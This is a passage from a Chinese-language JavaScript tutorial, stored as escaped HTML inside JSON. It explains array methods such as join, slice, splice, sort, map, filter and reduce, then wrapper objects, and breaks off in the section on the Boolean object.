&#039;b&#039;, &#039;c&#039;];\n\na.unshift(&#039;x&#039;); // 4\na // [&#039;x&#039;, &#039;a&#039;, &#039;b&#039;, &#039;c&#039;]</code></pre><p><code>unshift</code>方法可以接受多个参数，这些参数都会添加到目标数组头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;c&#039;, &#039;d&#039; ];\narr.unshift(&#039;a&#039;, &#039;b&#039;) // 4\narr // [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039; ]</code></pre>\n        <h3>\n            <a href='#join()' class='header-anchor'>#</a>\n            <span>join()</span>\n        </h3>\n    <p><code>join</code>方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3, 4];\n\na.join(&#039; &#039;) // &#039;1 2 3 4&#039;\na.join(&#039; | &#039;) // &quot;1 | 2 | 3 | 4&quot;\na.join() // &quot;1,2,3,4&quot;</code></pre><p>如果数组成员是<code>undefined</code>或<code>null</code>或空位，会被转成空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>[undefined, null].join(&#039;#&#039;)\n// &#039;#&#039;\n\n[&#039;a&#039;,, &#039;b&#039;].join(&#039;-&#039;)\n// &#039;a--b&#039;</code></pre><p>通过<code>call</code>方法，这个方法也可以用于字符串或类似数组的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.join.call(&#039;hello&#039;, &#039;-&#039;)\n// &quot;h-e-l-l-o&quot;\n\nvar obj = { 0: &#039;a&#039;, 1: &#039;b&#039;, length: 2 };\nArray.prototype.join.call(obj, &#039;-&#039;)\n// &#039;a-b&#039;</code></pre>\n        <h3>\n            <a href='#concat()' class='header-anchor'>#</a>\n            <span>concat()</span>\n        </h3>\n    <p><code>concat</code>方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;hello&#039;].concat([&#039;world&#039;])\n// [&quot;hello&quot;, &quot;world&quot;]\n\n[&#039;hello&#039;].concat([&#039;world&#039;], [&#039;!&#039;])\n// [&quot;hello&quot;, &quot;world&quot;, &quot;!&quot;]\n\n[].concat({a: 1}, {b: 2})\n// [{ a: 1 }, { b: 2 }]\n\n[2].concat({a: 1})\n// [2, {a: 1}]</code></pre><p>除了数组作为参数，<code>concat</code>也接受其他类型的值作为参数，添加到目标数组尾部。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].concat(4, 5, 6)\n// [1, 2, 3, 4, 5, 6]</code></pre><p>如果数组成员包括对象，<code>concat</code>方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { a: 1 };\nvar oldArray = [obj];\n\nvar newArray = oldArray.concat();\n\nobj.a = 2;\nnewArray[0].a // 2</code></pre><p>上面代码中，原数组包含一个对象，<code>concat</code>方法生成的新数组包含这个对象的引用。所以，改变原对象以后，新数组跟着改变。</p>\n\n        <h3>\n            <a href='#reverse()' class='header-anchor'>#</a>\n            <span>reverse()</span>\n        </h3>\n    <p><code>reverse</code>方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.reverse() // [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]\na // [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]</code></pre>\n        <h3>\n            <a href='#slice()' class='header-anchor'>#</a>\n            <span>slice()</span>\n        </h3>\n    <p><code>slice</code>方法用于提取目标数组的一部分，返回一个新数组，原数组不变。</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.slice(start, end);</code></pre><p>它的第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.slice(0) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]\na.slice(1) // [&quot;b&quot;, &quot;c&quot;]\na.slice(1, 2) // [&quot;b&quot;]\na.slice(2, 6) // [&quot;c&quot;]\na.slice() // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，最后一个例子<code>slice</code>没有参数，实际上等于返回一个原数组的拷贝。</p>\n<p>如果<code>slice</code>方法的参数是负数，则表示倒数计算的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\na.slice(-2) // [&quot;b&quot;, &quot;c&quot;]\na.slice(-2, -1) // [&quot;b&quot;]</code></pre><p>上面代码中，<code>-2</code>表示倒数计算的第二个位置，<code>-1</code>表示倒数计算的第一个位置。</p>\n<p>如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\na.slice(4) // []\na.slice(2, 1) // []</code></pre><p><code>slice</code>方法的一个重要应用，是将类似数组的对象转为真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.slice.call({ 0: &#039;a&#039;, 1: &#039;b&#039;, length: 2 })\n// [&#039;a&#039;, &#039;b&#039;]\n\nArray.prototype.slice.call(document.querySelectorAll(&quot;div&quot;));\nArray.prototype.slice.call(arguments);</code></pre><p>上面代码的参数都不是数组，但是通过<code>call</code>方法，在它们上面调用<code>slice</code>方法，就可以把它们转为真正的数组。</p>\n\n        <h3>\n            <a href='#splice()' class='header-anchor'>#</a>\n            <span>splice()</span>\n        </h3>\n    <p><code>splice</code>方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.splice(start, count, addElement1, addElement2, ...);</code></pre><p><code>splice</code>的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(4, 2) // [&quot;e&quot;, &quot;f&quot;]\na // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</code></pre><p>上面代码从原数组4号位置，删除了两个数组成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(4, 2, 1, 2) // [&quot;e&quot;, &quot;f&quot;]\na // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, 1, 2]</code></pre><p>上面代码除了删除成员，还插入了两个新成员。</p>\n<p>起始位置如果是负数，就表示从倒数位置开始删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(-4, 2) // [&quot;c&quot;, &quot;d&quot;]</code></pre><p>上面代码表示，从倒数第四个位置<code>c</code>开始删除两个成员。</p>\n<p>如果只是单纯地插入元素，<code>splice</code>方法的第二个参数可以设为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 1, 1];\n\na.splice(1, 0, 2) // []\na // [1, 2, 1, 1]</code></pre><p>如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3, 4];\na.splice(2) // [3, 4]\na // [1, 2]</code></pre>\n        <h3>\n            <a href='#sort()' class='header-anchor'>#</a>\n            <span>sort()</span>\n        </h3>\n    <p><code>sort</code>方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;d&#039;, &#039;c&#039;, &#039;b&#039;, &#039;a&#039;].sort()\n// [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;]\n\n[4, 3, 2, 1].sort()\n// [1, 2, 3, 4]\n\n[11, 101].sort()\n// [101, 11]\n\n[10111, 1101, 111].sort()\n// [10111, 1101, 111]</code></pre><p>上面代码的最后两个例子，需要特殊注意。<code>sort</code>方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字典顺序进行比较，所以<code>101</code>排在<code>11</code>的前面。</p>\n<p>如果想让<code>sort</code>方法按照自定义方式排序，可以传入一个函数作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>[10111, 1101, 111].sort(function (a, b) {\n  return a - b;\n})\n// [111, 1101, 10111]</code></pre><p>上面代码中，<code>sort</code>的参数函数本身接受两个参数，表示进行比较的两个数组成员。如果该函数的返回值大于<code>0</code>，表示第一个成员排在第二个成员后面；其他情况下，都是第一个元素排在第二个元素前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>[\n  { name: &quot;张三&quot;, age: 30 },\n  { name: &quot;李四&quot;, age: 24 },\n  { name: &quot;王五&quot;, age: 28  }\n].sort(function (o1, o2) {\n  return o1.age - o2.age;\n})\n// [\n//   { name: &quot;李四&quot;, age: 24 },\n//   { name: &quot;王五&quot;, age: 28  },\n//   { name: &quot;张三&quot;, age: 30 }\n// ]</code></pre>\n        <h3>\n            <a href='#map()' class='header-anchor'>#</a>\n            <span>map()</span>\n        </h3>\n    <p><code>map</code>方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var numbers = [1, 2, 3];\n\nnumbers.map(function (n) {\n  return n + 1;\n});\n// [2, 3, 4]\n\nnumbers\n// [1, 2, 3]</code></pre><p>上面代码中，<code>numbers</code>数组的所有成员依次执行参数函数，运行结果组成一个新数组返回，原数组没有变化。</p>\n<p><code>map</code>方法接受一个函数作为参数。该函数调用时，<code>map</code>方法向它传入三个参数：当前成员、当前位置和数组本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].map(function(elem, index, arr) {\n  return elem * index;\n});\n// [0, 2, 6]</code></pre><p>上面代码中，<code>map</code>方法的回调函数有三个参数，<code>elem</code>为当前成员的值，<code>index</code>为当前成员的位置，<code>arr</code>为原数组（<code>[1, 2, 3]</code>）。</p>\n<p><code>map</code>方法还可以接受第二个参数，用来绑定回调函数内部的<code>this</code>变量（详见《this 变量》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\n[1, 2].map(function (e) {\n  return this[e];\n}, arr)\n// [&#039;b&#039;, &#039;c&#039;]</code></pre><p>上面代码通过<code>map</code>方法的第二个参数，将回调函数内部的<code>this</code>对象，指向<code>arr</code>数组。</p>\n<p>如果数组有空位，<code>map</code>方法的回调函数在这个位置不会执行，会跳过数组的空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function (n) { return &#039;a&#039; };\n\n[1, undefined, 2].map(f) // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]\n[1, null, 2].map(f) // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]\n[1, , 2].map(f) // [&quot;a&quot;, , &quot;a&quot;]</code></pre><p>上面代码中，<code>map</code>方法不会跳过<code>undefined</code>和<code>null</code>，但是会跳过空位。</p>\n\n        <h3>\n            <a href='#forEach()' class='header-anchor'>#</a>\n            <span>forEach()</span>\n        </h3>\n    <p><code>forEach</code>方法与<code>map</code>方法很相似，也是对数组的所有成员依次执行参数函数。但是，<code>forEach</code>方法不返回值，只用来操作数据。这就是说，如果数组遍历的目的是为了得到返回值，那么使用<code>map</code>方法，否则使用<code>forEach</code>方法。</p>\n<p><code>forEach</code>的用法与<code>map</code>方法一致，参数是一个函数，该函数同样接受三个参数：当前值、当前位置、整个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>function log(element, index, array) {\n  console.log(&#039;[&#039; + index + &#039;] = &#039; + element);\n}\n\n[2, 5, 9].forEach(log);\n// [0] = 2\n// [1] = 5\n// [2] = 9</code></pre><p>上面代码中，<code>forEach</code>遍历数组不是为了得到返回值，而是为了在屏幕输出内容，所以不必使用<code>map</code>方法。</p>\n<p><code>forEach</code>方法也可以接受第二个参数，绑定参数函数的<code>this</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var out = [];\n\n[1, 2, 3].forEach(function(elem) {\n  this.push(elem * elem);\n}, out);\n\nout // [1, 4, 9]</code></pre><p>上面代码中，空数组<code>out</code>是<code>forEach</code>方法的第二个参数，结果，回调函数内部的<code>this</code>关键字就指向<code>out</code>。</p>\n<p>注意，<code>forEach</code>方法无法中断执行，总是会将所有成员遍历完。如果希望符合某种条件时，就中断遍历，要使用<code>for</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\n\nfor (var i = 0; i &lt; arr.length; i++) {\n  if (arr[i] === 2) break;\n  console.log(arr[i]);\n}\n// 1</code></pre><p>上面代码中，执行到数组的第二个成员时，就会中断执行。<code>forEach</code>方法做不到这一点。</p>\n<p><code>forEach</code>方法也会跳过数组的空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var log = function (n) {\n  console.log(n + 1);\n};\n\n[1, undefined, 2].forEach(log)\n// 2\n// NaN\n// 3\n\n[1, null, 2].forEach(log)\n// 2\n// 1\n// 3\n\n[1, , 2].forEach(log)\n// 2\n// 3</code></pre><p>上面代码中，<code>forEach</code>方法不会跳过<code>undefined</code>和<code>null</code>，但会跳过空位。</p>\n\n        <h3>\n            <a href='#filter()' class='header-anchor'>#</a>\n            <span>filter()</span>\n        </h3>\n    <p><code>filter</code>方法用于过滤数组成员，满足条件的成员组成一个新数组返回。</p>\n<p>它的参数是一个函数，所有数组成员依次执行该函数，返回结果为<code>true</code>的成员组成一个新数组返回。该方法不会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].filter(function (elem) {\n  return (elem &gt; 3);\n})\n// [4, 5]</code></pre><p>上面代码将大于<code>3</code>的数组成员，作为一个新数组返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [0, 1, &#039;a&#039;, false];\n\narr.filter(Boolean)\n// [1, &quot;a&quot;]</code></pre><p>上面代码中，<code>filter</code>方法返回数组<code>arr</code>里面所有布尔值为<code>true</code>的成员。</p>\n<p><code>filter</code>方法的参数函数可以接受三个参数：当前成员，当前位置和整个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].filter(function (elem, index, arr) {\n  return index % 2 === 0;\n});\n// [1, 3, 5]</code></pre><p>上面代码返回偶数位置的成员组成的新数组。</p>\n<p><code>filter</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { MAX: 3 };\nvar myFilter = function (item) {\n  if (item &gt; this.MAX) return true;\n};\n\nvar arr = [2, 8, 3, 4, 1, 3, 2, 9];\narr.filter(myFilter, obj) // [8, 4, 9]</code></pre><p>上面代码中，过滤器<code>myFilter</code>内部有<code>this</code>变量，它可以被<code>filter</code>方法的第二个参数<code>obj</code>绑定，返回大于<code>3</code>的成员。</p>\n\n        <h3>\n            <a href='#some()，every()' class='header-anchor'>#</a>\n            <span>some()，every()</span>\n        </h3>\n    <p>这两个方法类似“断言”（assert），返回一个布尔值，表示判断数组成员是否符合某种条件。</p>\n<p>它们接受一个函数作为参数，所有数组成员依次执行该函数。该函数接受三个参数：当前成员、当前位置和整个数组，然后返回一个布尔值。</p>\n<p><code>some</code>方法是只要一个成员的返回值是<code>true</code>，则整个<code>some</code>方法的返回值就是<code>true</code>，否则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3, 4, 5];\narr.some(function (elem, index, arr) {\n  return elem &gt;= 3;\n});\n// true</code></pre><p>上面代码中，如果数组<code>arr</code>有一个成员大于等于3，<code>some</code>方法就返回<code>true</code>。</p>\n<p><code>every</code>方法是所有成员的返回值都是<code>true</code>，整个<code>every</code>方法才返回<code>true</code>，否则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3, 4, 5];\narr.every(function (elem, index, arr) {\n  return elem &gt;= 3;\n});\n// false</code></pre><p>上面代码中，数组<code>arr</code>并非所有成员大于等于<code>3</code>，所以返回<code>false</code>。</p>\n<p>注意，对于空数组，<code>some</code>方法返回<code>false</code>，<code>every</code>方法返回<code>true</code>，回调函数都不会执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>function isEven(x) { return x % 2 === 0 }\n\n[].some(isEven) // false\n[].every(isEven) // true</code></pre><p><code>some</code>和<code>every</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>\n\n        <h3>\n            <a href='#reduce()，reduceRight()' class='header-anchor'>#</a>\n            <span>reduce()，reduceRight()</span>\n        </h3>\n    <p><code>reduce</code>方法和<code>reduceRight</code>方法依次处理数组的每个成员，最终累计为一个值。它们的差别是，<code>reduce</code>是从左到右处理（从第一个成员到最后一个成员），<code>reduceRight</code>则是从右到左（从最后一个成员到第一个成员），其他完全一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].reduce(function (a, b) {\n  console.log(a, b);\n  return a + b;\n})\n// 1 2\n// 3 3\n// 6 4\n// 10 5\n//最后结果：15</code></pre><p>上面代码中，<code>reduce</code>方法求出数组所有成员的和。第一次执行，<code>a</code>是数组的第一个成员<code>1</code>，<code>b</code>是数组的第二个成员<code>2</code>。第二次执行，<code>a</code>为上一轮的返回值<code>3</code>，<code>b</code>为第三个成员<code>3</code>。第三次执行，<code>a</code>为上一轮的返回值<code>6</code>，<code>b</code>为第四个成员<code>4</code>。第四次执行，<code>a</code>为上一轮返回值<code>10</code>，<code>b</code>为第五个成员<code>5</code>。至此所有成员遍历完成，整个方法的返回值就是最后一轮的返回值<code>15</code>。</p>\n<p><code>reduce</code>方法和<code>reduceRight</code>方法的第一个参数都是一个函数。该函数接受以下四个参数。</p>\n<ol>\n<li>累积变量，默认为数组的第一个成员</li>\n<li>当前变量，默认为数组的第二个成员</li>\n<li>当前位置（从0开始）</li>\n<li>原数组</li>\n</ol>\n<p>这四个参数之中，只有前两个是必须的，后两个则是可选的。</p>\n<p>如果要对累积变量指定初值，可以把它放在<code>reduce</code>方法和<code>reduceRight</code>方法的第二个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].reduce(function (a, b) {\n  return a + b;\n}, 10);\n// 25</code></pre><p>上面代码指定参数<code>a</code>的初值为10，所以数组从10开始累加，最终结果为25。注意，这时<code>b</code>是从数组的第一个成员开始遍历。</p>\n<p>上面的第二个参数相当于设定了默认值，处理空数组时尤其有用。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(prev, cur) {\n  return prev + cur;\n}\n\n[].reduce(add)\n// TypeError: Reduce of empty array with no initial value\n[].reduce(add, 1)\n// 1</code></pre><p>上面代码中，由于空数组取不到初始值，<code>reduce</code>方法会报错。这时，加上第二个参数，就能保证总是会返回一个值。</p>\n<p>下面是一个<code>reduceRight</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function substract(prev, cur) {\n  return prev - cur;\n}\n\n[3, 2, 1].reduce(substract) // 0\n[3, 2, 1].reduceRight(substract) // -4</code></pre><p>上面代码中，<code>reduce</code>方法相当于<code>3</code>减去<code>2</code>再减去<code>1</code>，<code>reduceRight</code>方法相当于<code>1</code>减去<code>2</code>再减去<code>3</code>。</p>\n<p>由于这两个方法会遍历数组，所以实际上还可以用来做一些遍历相关的操作。比如，找出字符长度最长的数组成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>function findLongest(entries) {\n  return entries.reduce(function (longest, entry) {\n    return entry.length &gt; longest.length ? entry : longest;\n  }, &#039;&#039;);\n}\n\nfindLongest([&#039;aaa&#039;, &#039;bb&#039;, &#039;c&#039;]) // &quot;aaa&quot;</code></pre><p>上面代码中，<code>reduce</code>的参数函数会将字符长度较长的那个数组成员，作为累积值。这导致遍历所有成员之后，累积值就是字符长度最长的那个成员。</p>\n\n        <h3>\n            <a href='#indexOf()，lastIndexOf()' class='header-anchor'>#</a>\n            <span>indexOf()，lastIndexOf()</span>\n        </h3>\n    <p><code>indexOf</code>方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.indexOf(&#039;b&#039;) // 1\na.indexOf(&#039;y&#039;) // -1</code></pre><p><code>indexOf</code>方法还可以接受第二个参数，表示搜索的开始位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a&#039;, &#039;b&#039;, &#039;c&#039;].indexOf(&#039;a&#039;, 1) // -1</code></pre><p>上面代码从1号位置开始搜索字符<code>a</code>，结果为<code>-1</code>，表示没有搜索到。</p>\n<p><code>lastIndexOf</code>方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [2, 5, 9, 2];\na.lastIndexOf(2) // 3\na.lastIndexOf(7) // -1</code></pre><p>注意，这两个方法不能用来搜索<code>NaN</code>的位置，即它们无法确定数组成员是否包含<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[NaN].indexOf(NaN) // -1\n[NaN].lastIndexOf(NaN) // -1</code></pre><p>这是因为这两个方法内部，使用严格相等运算符（<code>===</code>）进行比较，而<code>NaN</code>是唯一一个不等于自身的值。</p>\n\n        <h3>\n            <a href='#链式使用' class='header-anchor'>#</a>\n            <span>链式使用</span>\n        </h3>\n    <p>上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var users = [\n  {name: &#039;tom&#039;, email: &#039;tom@example.com&#039;},\n  {name: &#039;peter&#039;, email: &#039;peter@example.com&#039;}\n];\n\nusers\n.map(function (user) {\n  return user.email;\n})\n.filter(function (email) {\n  return /^t/.test(email);\n})\n.forEach(console.log);\n// &quot;tom@example.com&quot;</code></pre><p>上面代码中，先产生一个所有 Email 地址组成的数组，然后再过滤出以<code>t</code>开头的 Email 地址。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Nicolas Bevacqua, <a href=\"http://flippinawesome.org/2013/11/25/fun-with-javascript-native-array-functions/\">Fun with JavaScript Native Array Functions</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"包装对象","link":"/stdlib/wrapper.html"}],"content":"\n        <h1>\n            <a href='#包装对象' class='header-anchor'>#</a>\n            <span>包装对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h2>\n    <p>对象是 JavaScript 语言最主要的数据类型，三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”。</p>\n<p>所谓“包装对象”，就是分别与数值、字符串、布尔值相对应的<code>Number</code>、<code>String</code>、<code>Boolean</code>三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1 = new Number(123);\nvar v2 = new String(&#039;abc&#039;);\nvar v3 = new Boolean(true);</code></pre><p>上面代码中，基于原始类型的值，生成了三个对应的包装对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof v1 // &quot;object&quot;\ntypeof v2 // &quot;object&quot;\ntypeof v3 // &quot;object&quot;\n\nv1 === 123 // false\nv2 === &#039;abc&#039; // false\nv3 === true // false</code></pre><p>包装对象的最大目的，首先是使得 JavaScript 的对象涵盖所有的值，其次使得原始类型的值可以方便地调用某些方法。</p>\n<p><code>Number</code>、<code>String</code>和<code>Boolean</code>如果不作为构造函数调用（即调用时不加<code>new</code>），常常用于将任意类型的值转为数值、字符串和布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(123) // 123\nString(&#039;abc&#039;) // &quot;abc&quot;\nBoolean(true) // true</code></pre><p>上面这种数据类型的转换，详见《数据类型转换》一节。</p>\n<p>总结一下，这三个对象作为构造函数使用（带有<code>new</code>）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有<code>new</code>），可以将任意类型的值，转为原始类型的值。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p>三种包装对象各自提供了许多实例方法，详见后文。这里介绍两种它们共同具有、从<code>Object</code>对象继承的方法：<code>valueOf</code>和<code>toString</code>。</p>\n\n        <h3>\n            <a href='#valueOf()' class='header-anchor'>#</a>\n            <span>valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法返回包装对象实例对应的原始类型的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Number(123).valueOf()  // 123\nnew String(&#039;abc&#039;).valueOf() // &quot;abc&quot;\nnew Boolean(true).valueOf() // true</code></pre>\n        <h3>\n            <a href='#toString()' class='header-anchor'>#</a>\n            <span>toString()</span>\n        </h3>\n    <p><code>toString</code>方法返回对应的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Number(123).toString() // &quot;123&quot;\nnew String(&#039;abc&#039;).toString() // &quot;abc&quot;\nnew Boolean(true).toString() // &quot;true&quot;</code></pre>\n        <h2>\n            <a href='#原始类型与实例对象的自动转换' class='header-anchor'>#</a>\n            <span>原始类型与实例对象的自动转换</span>\n        </h2>\n    <p>原始类型的值，可以自动当作包装对象调用，即调用包装对象的属性和方法。这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，在使用后立刻销毁实例。</p>\n<p>比如，字符串可以调用<code>length</code>属性，返回字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.length // 3</code></pre><p>上面代码中，<code>abc</code>是一个字符串，本身不是对象，不能调用<code>length</code>属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用<code>length</code>属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型与实例对象的自动转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var str = &#039;abc&#039;;\nstr.length // 3\n\n// 等同于\nvar strObj = new String(str)\n// String {\n//   0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3, [[PrimitiveValue]]: &quot;abc&quot;\n// }\nstrObj.length // 3</code></pre><p>上面代码中，字符串<code>abc</code>的包装对象提供了多个属性。</p>\n<p>自动转换生成的包装对象是只读的，无法修改。所以，字符串无法添加新属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;Hello World&#039;;\ns.x = 123;\ns.x // undefined</code></pre><p>上面代码为字符串<code>s</code>添加了一个<code>x</code>属性，结果无效，总是返回<code>undefined</code>。</p>\n<p>另一方面，调用结束后，包装对象实例会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果要为字符串添加属性，只有在它的原型对象<code>String.prototype</code>上定义（参见《面向对象编程》章节）。</p>\n\n        <h2>\n            <a href='#自定义方法' class='header-anchor'>#</a>\n            <span>自定义方法</span>\n        </h2>\n    <p>除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用。</p>\n<p>比如，我们可以新增一个<code>double</code>方法，使得字符串和数字翻倍。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.prototype.double = function () {\n  return this.valueOf() + this.valueOf();\n};\n\n&#039;abc&#039;.double()\n// abcabc\n\nNumber.prototype.double = function () {\n  return this.valueOf() + this.valueOf();\n};\n\n(123).double()\n// 246</code></pre><p>上面代码在<code>123</code>外面必须要加上圆括号，否则后面的点运算符（<code>.</code>）会被解释成小数点。</p>\n<p>但是，这种自定义方法和属性的机制，只能定义在包装对象的原型上，如果直接对原始类型的变量添加属性，则无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;abc&#039;;\n\ns.p = 123;\ns.p // undefined</code></pre><p>上面代码直接对字符串<code>abc</code>添加属性，结果无效。主要原因是上面说的，这里的包装对象是自动生成的，赋值后自动销毁，所以最后一行实际上调用的是一个新的包装对象。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Boolean 对象","link":"/stdlib/boolean.html"}],"content":"\n        <h1>\n            <a href='#Boolean-对象' class='header-anchor'>#</a>\n            <span>Boolean 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>Boolean</code>对象是 JavaScript 的三个包装对象之一。作为构造函数，它主要用于生成布尔值的包装对象实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var b = new Boolean(true);\n\ntypeof b // &quot;object&quot;\nb.valueOf() // true</code></pre><p>上面代码的变量<code>b</code>是一个<code>Boolean</code>对象的实例，它的类型是对象，值为布尔值<code>true</code>。</p>\n<p>注意，<code>false</code>对应的包装对象实例，布尔运算结果也是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (new Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // true\n\nif (new Boolean(false).valueOf()) {\n  console.log(&#039;true&#039;);\n} // 